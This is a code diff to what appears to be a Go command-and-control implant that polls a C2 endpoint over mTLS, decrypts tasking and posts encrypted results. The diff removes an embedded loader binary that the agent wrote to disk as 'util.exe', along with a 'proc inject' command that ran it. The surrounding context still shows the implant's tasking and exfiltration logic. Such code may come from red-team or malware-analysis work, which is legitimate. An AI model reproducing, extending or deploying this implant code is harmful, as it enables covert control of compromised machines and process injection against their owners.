@@ -4,7 +4,6 @@ package main
 
 import (
 	"bytes"
-	_ "embed"
 	"encoding/json"
 	"fmt"
 	"io/fs"
@@ -13,7 +12,6 @@ import (
 	"net/http"
 	"net/url"
 	"os"
-	"os/exec"
 	"path/filepath"
 	"strconv"
 	"sync"
@@ -40,21 +38,9 @@ var (
 	InitAESKey      string
 	X1              string
 	X2              string
-	loaderPath      string
 )
 
-//go:embed karl_port.exe
-var loader []byte // the loader is embedded into this file, then dropped
-
 func main() {
-	ex, err := os.Executable()
-	if err != nil {
-		log.Fatal(err)
-	}
-	loaderPath = filepath.Join(filepath.Dir(ex), "util.exe")
-	if err = os.WriteFile(loaderPath, loader, 0700); err != nil {
-		log.Fatal(err)
-	}
 	// Assign known commands to command function map
 	var wg sync.WaitGroup
 	c2Endpoint := InitC2Endpoint
@@ -82,17 +68,12 @@ func main() {
 
 func awaitFile(c2Endpoint, UUID, kX1, kX2, aesKey string, ticker *time.Ticker, mTLSClient *http.Client) {
 	var prevCmd int
-	var first = true
 	for range ticker.C {
 		fObject, cmdID, err := getObjectBytes(prevCmd, c2Endpoint, UUID, kX1, kX2, aesKey, mTLSClient, "2")
 		if err != nil {
 			continue
 		}
 		prevCmd = cmdID
-		if first {
-			first = false
-			continue
-		}
 		fileObj := &models.KarObjectFile{}
 		if err := json.Unmarshal(fObject, fileObj); err != nil {
 			continue
@@ -234,13 +215,6 @@ func parseCmdObject(cmdObject *models.KarObjectCmd, cmdID int, c2Endpoint, UUID 
 		} else {
 			return
 		}
-	// proc inject
-	case 5:
-		cmd := exec.Command(loaderPath, args[0].StrValue, args[1].StrValue)
-		if err = cmd.Run(); err != nil {
-			responseObject.Code = 1
-			responseObject.Data.Error = err.Error()
-		}
 	}
 	if objType == 1 {
 		respObjectBytes, _ = json.Marshal(responseObject)
@@ -249,7 +223,6 @@ func parseCmdObject(cmdObject *models.KarObjectCmd, cmdID int, c2Endpoint, UUID 
 	}
 	respObjectBytes, err = kes.EncryptObject(respObjectBytes, aesKey, X1, X2)
 	if err != nil {
-		log.Error("")
 		return
 	}
 	go postData(c2Endpoint, UUID, mTLSClient, &models.GenericData{
